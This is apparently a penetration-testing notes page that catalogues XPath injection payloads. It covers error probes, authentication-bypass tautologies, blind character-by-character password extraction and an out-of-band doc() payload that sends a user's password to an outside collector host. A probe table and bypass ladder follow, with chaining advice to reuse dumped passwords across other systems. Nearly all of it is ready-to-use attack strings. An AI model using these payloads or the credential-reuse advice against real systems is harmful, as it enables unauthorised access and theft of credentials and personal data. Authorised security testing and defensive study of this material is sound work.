---
title: "Payloads: XPath Injection"
type: payloads
tags: [payloads, xpath, injection, xml, web]
sources: []
date_created: 2026-06-16
date_updated: 2026-10-31
---

# Payloads: XPath Injection

Inject into XPath queries over XML (OWASP A03). Routed via the `hunt-injection` skill. See [[xpath-injection]].

## Detect
```
'        "        or        and        ]        )
# single quote -> XPath error or changed results = injectable
```

## Auth bypass
```
' or '1'='1          ' or ''='          x' or 1=1 or 'x'='y
admin' or '1'='1' or 'a'='a
') or ('1'='1        ' or name()='username' or 'x'='y
@*    //*    count(/child::node())
```

## Blind extraction (boolean)
```
' and string-length(//user[1]/password)=8 and '1'='1     # length
' and substring(//user[1]/password,1,1)='a' and '1'='1   # char by char
' and substring(//user[1]/password,POS,1)=codepoints-to-string(ORD) and '1'='1
# enumerate node names:
' and name(/*[1])='users' and '1'='1
```

## Out-of-band (if doc() supported)
```
' and doc('//attacker/share') or '1'='1
' and doc(concat('http://oob/',encode-for-uri(//user[1]/password))) or '1'='1
```

## Real-world
Legacy SOAP/XML auth and XML-stored user DBs; `' or '1'='1` style bypass and char-by-char blind extraction dump the whole document (no privilege model in XPath). Often pairs with [[xxe]] on the same endpoint.

## Probe set

| probe | where | expected signal |
|---|---|---|
| lone single quote | any XML-backed param | XPath/XQuery error text or blank result |
| lone double quote | same param | error = double-quoted context |
| boolean tautology | login/filter | `x' or '1'='1` returns all rows = bypass |
| boolean contradiction | same spot | `x' or '1'='2` returns none; the pair is the oracle |
| numeric `or 1=1` | numeric XML param | full result set returned |
| paren context breakout | `(...)` shaped query | `') or ('1'='1` lands |
| node-name enumeration | blind boolean | `name(/*[1])='users'` splits true/false |
| string-length split | blind extraction | correct length flips the response |
| substring char split | blind extraction | per-char true/false oracle, bisect with `codepoints-to-string` |
| document dump | reflected output | `//*` or `@*` returns nodes inline |
| OOB `doc()` probe | engine with file/http access | DNS/HTTP callback = out-of-band channel live |
| error text as oracle | error-reflecting app | engine error embeds the queried value |
| bracket/paren fuzz | param inside a predicate | lone `]` or `)` errors = context shape leaks |
| `count(/)` arithmetic | blind numeric context | response scales with the node count |
| comment-out tail | trailing query context | `x' or '1'='1` vs `'/*` style closes the rest of the query |

## Bypass ladder

| rung | technique |
|---|---|
| 1 | quote breakout with tautology: `x' or '1'='1` |
| 2 | alternate context: `') or ('1'='1`, double-quote variant |
| 3 | wildcard dump `//*` / `@*` where output is reflected |
| 4 | boolean-blind char-by-char via `substring` |
| 5 | `codepoints-to-string` to dodge character filters |
| 6 | error-based extraction when the engine echoes values |
| 7 | OOB `doc(concat(...))` exfil when network functions exist |

## Confirmation

Finding = one captured request pair in Burp Repeater: the tautology request AND the contradiction request, responses differing exactly as the boolean predicts; or the raw OOB callback payload plus the collector hit.
Negative control: the benign value returns the normal single result, and a syntactically-valid but semantically-false probe returns the empty/false branch, proving the oracle tracks your input.
Keep both responses of the pair in full (headers + body): the differential IS the evidence.
Severity ladder: auth bypass = Critical; blind full-document extraction (credentials, PII) = High; error-text value disclosure = Medium; single-node read = Low/Medium by data.

## Chaining notes

The same endpoint is often XXE-able: run the [[xxe]] probes before settling for XPath extraction.
Dumped XML user stores carry plaintext or weakly-hashed passwords; reuse them across the attack surface, not just the XML app.
Blind XPath is slow; if the same data is reachable via [[sql-injection]] on a sibling endpoint, prefer that lane first.
SOAP endpoints frequently wrap XPath results in errors: check WSDL first to learn the document shape cheaply.
